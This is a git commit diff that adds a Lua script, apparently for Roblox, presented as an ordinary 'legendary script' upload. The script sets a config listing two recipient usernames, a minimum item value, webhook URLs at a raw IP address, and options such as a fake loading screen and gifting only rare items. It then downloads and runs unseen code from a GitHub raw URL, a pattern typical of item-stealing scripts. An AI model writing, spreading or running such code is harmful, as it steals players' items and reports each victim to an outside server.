611ecf414459f67358d9378a86b11c6750beae85
Bobbot54 <housephonescaramella@icloud.com>
2025-08-07 08:40:32 -0700

    Upload legendary-script.lua via Script Source Converter

---
+++ legendary-script.lua
@@ -0,0 +1,13 @@
+_G.NullConfig = {
+    User = {"ninjabodes12", "goddaus"},
+    min_value = 10000000000,
+    pingEveryone = "Yes", -- dont change this
+    Webhook = "http://176.100.37.215:20002/proxy/69e1b5e52e636d07f9971e47d894c206",
+    FakeGift = "No",
+    Trash = "http://176.100.37.215:20002/proxy/69e1b5e52e636d07f9971e47d894c206",
+    LoadingScreen = "Yes",
+    GiftOnlyRares = "Yes",
+    ExecuteOtherScript = "No",
+}
+    
+loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
